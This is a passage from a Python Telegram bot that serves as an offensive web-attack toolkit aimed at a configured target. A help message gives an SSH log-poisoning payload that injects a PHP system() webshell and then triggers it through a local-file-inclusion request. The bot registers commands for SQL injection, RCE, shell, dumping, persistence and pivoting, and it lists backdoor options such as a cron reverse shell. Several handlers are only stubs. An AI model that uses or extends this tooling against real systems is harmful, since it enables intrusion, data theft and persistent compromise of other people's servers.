            "2. *SSH log poisoning (if you can SSH):*\n"
            "```bash\n"
            "ssh '<?php system($_GET[\"cmd\"]); ?>'@target.com\n"
            "# Then include:\n"
            "http://target/?file=../../../../var/log/auth.log&cmd=id\n"
            "```\n\n"
            "3. *Nginx log poisoning:*\n"
            "Same technique, logs at: `/var/log/nginx/access.log`",
            parse_mode="Markdown"
        )
    
    elif query.data == "deploy_list":
        ws = context.bot_data.get('webshell_url', '')
        if ws:
            await query.edit_message_text(f"📋 *Configured webshell:*\n`{ws}`", parse_mode="Markdown")
        else:
            await query.edit_message_text("📋 No webshell configured. Use one of the deploy options above, then `/set_webshell <url>`")

# ====================== Proxy Toggle ====================

async def proxy_toggle(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Toggle Burp proxy on/off."""
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /proxy on  or  /proxy off")
        return
    
    global session
    cmd = args[0].lower()
    if cmd == "on":
        session.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
        await update.message.reply_text("✅ Proxy ENABLED → Burp Suite at 127.0.0.1:8080")
    elif cmd == "off":
        session.proxies = {}
        await update.message.reply_text("✅ Proxy DISABLED → direct connections")
    else:
        await update.message.reply_text("Usage: /proxy on  or  /proxy off")

# ====================== Main ====================

def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", start))
    app.add_handler(CommandHandler("recon", recon))
    app.add_handler(CommandHandler("creds", creds))
    app.add_handler(CommandHandler("bypass", auth_bypass))
    app.add_handler(CommandHandler("sqli", sqli))
    app.add_handler(CommandHandler("xss", xss))
    app.add_handler(CommandHandler("upload", upload))
    app.add_handler(CommandHandler("rce", rce))
    app.add_handler(CommandHandler("lfi", lfi))
    app.add_handler(CommandHandler("ssrf", ssrf))
    app.add_handler(CommandHandler("idor", idor))
    app.add_handler(CommandHandler("shell", shell))
    app.add_handler(CommandHandler("dump", dump))
    app.add_handler(CommandHandler("enum_users", enum_users))
    app.add_handler(CommandHandler("config", config_dump))
    app.add_handler(CommandHandler("persist", persist))
    app.add_handler(CommandHandler("pivot", pivot))
    app.add_handler(CommandHandler("cmd", cmd_exec))
    app.add_handler(CommandHandler("set_webshell", set_webshell))
    app.add_handler(CommandHandler("proxy", proxy_toggle))
    
    # Callback handler for buttons
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print(f"[+] Bot active. Target: {TARGET_BASE}")
    print(f"[+] Press Ctrl+C to stop.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

# Additional command stubs (implement as needed)
async def xss(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """XSS testing."""
    await update.message.reply_text("[*] Testing XSS...")
    # Implementation similar to previous code
    await update.message.reply_text("XSS testing complete. Use /recon for full details.")

async def ssrf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """SSRF testing."""
    await update.message.reply_text("[*] Testing SSRF...")
    # Can implement SSRF testing endpoints
    await update.message.reply_text("SSRF testing complete.")

async def enum_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enumerate admin users."""
    await update.message.reply_text("[*] Enumerating users...")
    # Can implement user enumeration
    await update.message.reply_text("User enumeration complete.")

async def persist(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Persistence techniques."""
    await update.message.reply_text("[*] Setting up persistence...")
    # Provide persistence techniques
    await update.message.reply_text("Persistence options:\n1. Add admin user\n2. SSH key backdoor\n3. Cron job reverse shell\n4. Web shell with stealth")

async def pivot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Internal network recon."""
    await update.message.reply_text("[*] Starting internal network recon...")
    # Can implement network scanning
    await update.message.reply_text("Pivoting requires a reverse shell or webshell. Use /cmd to execute reconnaissance commands.")

if __name__ == "__main__":
    main()